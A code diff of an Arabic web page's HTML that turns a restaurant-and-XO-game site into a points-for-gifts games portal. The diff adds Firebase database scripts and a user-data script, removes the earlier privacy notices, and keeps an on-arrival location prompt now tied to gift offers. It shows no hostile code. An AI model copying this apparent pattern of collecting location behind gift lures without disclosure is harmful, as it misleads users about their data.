@@ -3,17 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مطعم الذواقة - العب XO عالمياً</title>
+    <title>عالم الألعاب - العب واكسب هدايا!</title>
     
-    <!-- مكتبات خارجية -->
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    
+    <!-- Leaflet للخريطة -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     
     <!-- ملفات CSS -->
     <link rel="stylesheet" href="css/main.css">
-    <link rel="stylesheet" href="css/menu.css">
-    <link rel="stylesheet" href="css/game.css">
+    <link rel="stylesheet" href="css/games.css">
     <link rel="stylesheet" href="css/points.css">
     <link rel="stylesheet" href="css/location.css">
 </head>
@@ -21,98 +23,85 @@
 
 <!-- ===== Header ===== -->
 <header>
-    <h1>🍽️ مطعم الذواقة</h1>
-    <p>اطلب • العب XO عالمياً • اكسب نقاط</p>
+    <h1>🎮 عالم الألعاب</h1>
+    <p>العب • اكسب نقاط • اربح هدايا حقيقية!</p>
     <div class="header-actions">
         <button class="icon-btn" onclick="App.openTab('points')" title="نقاطي">
             ⭐<span class="badge points-badge" id="totalPointsBadge">0</span>
-        </button>
-        <button class="icon-btn" onclick="Menu.openCart()" title="السلة">
-            🛒<span class="badge" id="cartBadge">0</span>
         </button>
     </div>
 </header>
 
 <!-- ===== التبويبات ===== -->
 <div class="tabs">
-    <div class="tab active" data-tab="menu" onclick="App.openTab('menu')">🍔 القائمة</div>
-    <div class="tab" data-tab="game" onclick="App.openTab('game')">🎮 XO</div>
-    <div class="tab" data-tab="device" onclick="App.openTab('device')">📱 جهازي</div>
+    <div class="tab active" data-tab="home" onclick="App.openTab('home')">🏠 الرئيسية</div>
+    <div class="tab" data-tab="games" onclick="App.openTab('games')">🎮 الألعاب</div>
     <div class="tab" data-tab="points" onclick="App.openTab('points')">⭐ النقاط</div>
 </div>
 
-<!-- ===== تبويب القائمة ===== -->
-<div class="tab-content active" id="tab-menu">
+<!-- ===== تبويب الرئيسية ===== -->
+<div class="tab-content active" id="tab-home">
     <div class="container">
-        <h2 class="section-title">🔥 الأطباق المميزة</h2>
-        <div class="menu-grid" id="menuGrid"></div>
-    </div>
-</div>
-
-<!-- ===== تبويب اللعبة ===== -->
-<div class="tab-content" id="tab-game">
-    <div class="container">
-        <div class="game-intro">
-            <h2>🎮 العب XO عالمياً!</h2>
-            <p>
-                تحدى أي شخص في العالم في لعبة XO!<br>
-                شارك الرابط أو الكود أو QR مع صديقك وابدأ اللعب فوراً<br>
-                كل فوز = <strong>10 نقاط</strong> • كل تعادل = <strong>3 نقاط</strong>
-            </p>
-        </div>
-
-        <div id="gameModeSelect">
-            <div class="game-modes">
-                <div class="mode-card" onclick="Game.startLocal()">
-                    <div class="icon">👥</div>
-                    <h3>لعب محلي</h3>
-                    <p>العب مع صديق على نفس الجهاز</p>
+        <div class="hero-section">
+            <div class="hero-icon">🎮</div>
+            <h2>مرحباً بك في عالم الألعاب!</h2>
+            <p>العب ألعاباً ممتعة واكسب نقاطاً لتستبدلها بهدايا حقيقية</p>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-icon">🎯</div>
+                    <div class="stat-value" id="gamesPlayed">0</div>
+                    <div class="stat-label">لعبة لعبتها</div>
                 </div>
-                <div class="mode-card" onclick="PeerGame.showLobby()">
-                    <div class="icon">🌍</div>
-                    <h3>لعب عالمي</h3>
-                    <p>العب مع أي شخص في العالم عبر الرابط</p>
+                <div class="stat-card">
+                    <div class="stat-icon">⭐</div>
+                    <div class="stat-value" id="totalPointsHome">0</div>
+                    <div class="stat-label">نقطة</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">🎁</div>
+                    <div class="stat-value" id="rewardsEarned">0</div>
+                    <div class="stat-label">هدية ربحتها</div>
                 </div>
             </div>
         </div>
-        <div id="onlineLobby" style="display:none;"></div>
-        <div id="gameScreen" style="display:none;"></div>
+
+        <div class="quick-actions">
+            <button class="action-btn primary" onclick="App.openTab('games')">
+                🎮 ابدأ اللعب الآن
+            </button>
+            <button class="action-btn secondary" onclick="App.openTab('points')">
+                🎁 استبدل نقاطك
+            </button>
+        </div>
     </div>
 </div>
 
-<!-- ===== تبويب معلومات الجهاز ===== -->
-<div class="tab-content" id="tab-device">
+<!-- ===== تبويب الألعاب ===== -->
+<div class="tab-content" id="tab-games">
     <div class="container">
-        <div class="device-hero">
-            <div class="icon">🔍</div>
-            <h2>معلومات جهازي</h2>
-            <p>اكتشف نوع جهازك ومواصفاته التقنية وعنوان IP العام</p>
-            <div class="bonus-badge">⭐ +5 نقاط عند زيارة هذه الصفحة (مرة يومياً)</div>
-        </div>
-
-        <div class="privacy-notice">
-            <h4>🔒 خصوصيتك محمية</h4>
-            <p>هذه المعلومات تُجمع <strong>محلياً في متصفحك فقط</strong> وتظهر لك أنت فقط:</p>
-            <ul>
-                <li>✅ لا يتم إرسال أي بيانات لخوادمنا</li>
-                <li>✅ الاتصال الوحيد الخارجي هو لجلب عنوان IP العام</li>
-                <li>✅ لا يتم تخزين أو تتبع أي معلومات شخصية</li>
-            </ul>
-        </div>
-
-        <div class="ip-card">
-            <div class="label">🌍 عنوان IP العام الخاص بك</div>
-            <div class="ip-value" id="ipAddress">جاري التحميل...</div>
-            <button class="copy-btn" onclick="DeviceInfo.copyIP()">📋 نسخ العنوان</button>
-        </div>
-
-        <div class="info-grid" id="infoGrid">
-            <div style="text-align:center; padding:20px; color:#718096;">
-                <p>جاري جمع معلومات الجهاز...</p>
+        <h2 class="section-title">🎮 اختر لعبتك المفضلة</h2>
+        <div class="games-grid">
+            <div class="game-card" onclick="GameXO.start()">
+                <div class="game-icon">⭕❌</div>
+                <h3>لعبة XO</h3>
+                <p>تحدى صديقك أو العب ضد الكمبيوتر</p>
+                <div class="game-reward">+10 نقاط لكل فوز</div>
+            </div>
+            <div class="game-card" onclick="GameMemory.start()">
+                <div class="game-icon">🧠</div>
+                <h3>لعبة الذاكرة</h3>
+                <p>اختبر قوة ذاكرتك</p>
+                <div class="game-reward">+15 نقطة للإكمال</div>
+            </div>
+            <div class="game-card" onclick="GameSnake.start()">
+                <div class="game-icon">🐍</div>
+                <h3>لعبة الثعبان</h3>
+                <p>اجمع النقاط وتجنب الاصطدام</p>
+                <div class="game-reward">+1 نقطة لكل 10 نقاط</div>
             </div>
         </div>
 
-        <button class="refresh-btn" onclick="DeviceInfo.refresh()">🔄 تحديث المعلومات</button>
+        <div id="gameContainer" style="display:none;"></div>
     </div>
 </div>
 
@@ -122,114 +111,30 @@
         <div class="points-card">
             <p>⭐ إجمالي نقاطك</p>
             <div class="big-number" id="totalPoints">0</div>
-            <p>استمر في اللعب والطلب واكتشاف جهازي لتكسب المزيد!</p>
+            <p>استمر في اللعب لتكسب المزيد!</p>
         </div>
 
-        <h2 class="section-title">🎁 المكافآت المتاحة</h2>
+        <h2 class="section-title">🎁 الهدايا المتاحة</h2>
         <div class="rewards-grid" id="rewardsGrid"></div>
-
-        <div class="privacy-notice" style="margin-top: 25px;">
-            <h4>📦 كيفية استلام المكافآت</h4>
-            <p>عند استبدال مكافأة <strong>مادية</strong>، سنطلب منك بوضوح:</p>
-            <ul>
-                <li>✅ اسمك الكامل</li>
-                <li>✅ عنوان التوصيل (إدخال يدوي)</li>
-                <li>✅ رقم هاتف للتواصل</li>
-                <li>✅ موافقتك الصريحة قبل الإرسال</li>
-            </ul>
-        </div>
     </div>
 </div>
 
-<!-- ===== Modal السلة ===== -->
-<div class="modal-overlay" id="cartModal">
-    <div class="modal">
-        <div class="modal-header">
-            <h2>🛒 سلة المشتريات</h2>
-            <button class="close-btn" onclick="Menu.closeCart()">✕</button>
-        </div>
-        <div id="cartContent"></div>
-    </div>
-</div>
-
-<!-- ===== Modal الموقع ===== -->
-<div class="modal-overlay" id="locationModal">
-    <div class="modal">
-        <div class="modal-header">
-            <h2>📍 عنوان التوصيل</h2>
-            <button class="close-btn" onclick="Location.close()">✕</button>
-        </div>
-        <div id="locationStep1">
-            <div class="location-info">
-                <h3>📦 لماذا نحتاج موقعك؟</h3>
-                <p>
-                    نحتاج موقعك <strong>لتوصيل طلبك بدقة</strong> وضمان وصول الطعام ساخناً.
-                    <br><br>
-                    🔒 <strong>موقعك آمن</strong> ولن يُستخدم إلا لهذا الطلب فقط.
-                </p>
-            </div>
-            <div class="location-actions">
-                <button class="loc-btn primary" onclick="Location.requestGPS()">📍 تحديد تلقائي</button>
-                <button class="loc-btn secondary" onclick="Location.showManualForm()">✍️ إدخال يدوي</button>
-            </div>
-            <div class="status-msg" id="statusMsg"></div>
-            <div id="mapContainer" style="display:none;">
-                <div id="map"></div>
-                <button class="confirm-btn" onclick="Location.confirmGPS()">✅ تأكيد العنوان</button>
-            </div>
-            <div class="manual-form" id="manualForm">
-                <div class="form-group"><label>👤 الاسم *</label><input type="text" id="customerName"></div>
-                <div class="form-group"><label>📱 الهاتف *</label><input type="tel" id="customerPhone"></div>
-                <div class="form-group"><label>🏙️ المدينة/الحي *</label><input type="text" id="customerCity"></div>
-                <div class="form-group"><label>🏠 العنوان التفصيلي *</label><textarea id="customerAddress"></textarea></div>
-                <div class="save-address-option">
-                    <input type="checkbox" id="saveAddressCheck">
-                    <label for="saveAddressCheck">💾 حفظ هذا العنوان كافتراضي للطلبات المستقبلية</label>
-                </div>
-                <button class="confirm-btn" onclick="Location.confirmManual()">✅ تأكيد</button>
-            </div>
-        </div>
-        <div id="successScreen" style="display:none;">
-            <div style="text-align:center; padding:30px 20px;">
-                <div style="font-size:80px; margin-bottom:15px;">✅</div>
-                <h2 style="color:#059669; margin-bottom:10px;">تم استلام طلبك!</h2>
-                <p style="color:#6b7280;">🕐 وقت التوصيل: <strong>30-45 دقيقة</strong></p>
-                <p style="margin-top:15px; padding:12px; background:#f0fdf4; border-radius:10px; color:#065f46;">
-                    🎉 حصلت على <strong id="orderPoints">0</strong> نقطة إضافية!
-                </p>
-                <button class="confirm-btn" style="margin-top:20px;" onclick="Location.resetOrder()">🏠 العودة</button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<!-- ===== Modal استبدال المكافأة ===== -->
-<div class="modal-overlay" id="rewardModal">
-    <div class="modal">
-        <div class="modal-header">
-            <h2>🎁 استبدال المكافأة</h2>
-            <button class="close-btn" onclick="Points.closeRewardModal()">✕</button>
-        </div>
-        <div id="rewardContent"></div>
-    </div>
-</div>
-
-<!-- ===== Modal طلب الموقع الفوري ===== -->
+<!-- ===== Modal طلب الموقع ===== -->
 <div class="modal-overlay" id="welcomeLocationModal">
     <div class="modal">
         <div style="text-align:center; padding:20px;">
-            <div style="font-size:70px; margin-bottom:15px;">📍</div>
-            <h2 style="color:#0369a1; margin-bottom:15px;">مرحباً بك في مطعم الذواقة!</h2>
+            <div style="font-size:70px; margin-bottom:15px;">🎁</div>
+            <h2 style="color:#0369a1; margin-bottom:15px;">مرحباً بك!</h2>
             <p style="color:#475569; line-height:1.7; margin-bottom:20px;">
-                للحصول على تجربة أفضل وتوصيل أسرع، هل تود السماح لنا بمعرفة موقعك؟
+                للحصول على <strong>هدايا حصرية</strong> وتجربة أفضل، هل تود السماح لنا بمعرفة موقعك؟
                 <br><br>
-                <strong>🔒 موقعك آمن ولن يُستخدم إلا عند طلبك للطعام فقط.</strong>
+                <strong>🔒 موقعك آمن</strong> ولن يُستخدم إلا لإرسال الهدايا إليك.
             </p>
             <div style="display:flex; gap:10px; flex-wrap:wrap;">
-                <button class="confirm-btn" style="flex:1; min-width:150px;" onclick="Location.handleWelcomeAllow()">
+                <button class="confirm-btn" style="flex:1; min-width:150px;" onclick="UserData.handleWelcomeAllow()">
                     ✅ السماح
                 </button>
-                <button class="confirm-btn" style="flex:1; min-width:150px; background:linear-gradient(135deg, #6b7280, #4b5563);" onclick="Location.handleWelcomeDeny()">
+                <button class="confirm-btn" style="flex:1; min-width:150px; background:linear-gradient(135deg, #6b7280, #4b5563);" onclick="UserData.handleWelcomeDeny()">
                     ⏭️ لاحقاً
                 </button>
             </div>
@@ -237,16 +142,27 @@
     </div>
 </div>
 
+<!-- ===== Modal استبدال الهدية ===== -->
+<div class="modal-overlay" id="rewardModal">
+    <div class="modal">
+        <div class="modal-header">
+            <h2>🎁 استبدال الهدية</h2>
+            <button class="close-btn" onclick="Points.closeRewardModal()">✕</button>
+        </div>
+        <div id="rewardContent"></div>
+    </div>
+</div>
+
 <div class="toast" id="toast"></div>
 
-<!-- ملفات JavaScript بالترتيب -->
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<!-- ملفات JavaScript -->
+<script src="js/firebase-config.js"></script>
 <script src="js/utils.js"></script>
+<script src="js/user-data.js"></script>
 <script src="js/points.js"></script>
-<script src="js/menu.js"></script>
-<script src="js/location.js"></script>
-<script src="js/game.js"></script>
-<script src="js/peer-game.js"></script>
+<script src="js/game-xo.js"></script>
+<script src="js/game-memory.js"></script>
+<script src="js/game-snake.js"></script>
 <script src="js/app.js"></script>
 
 </body>
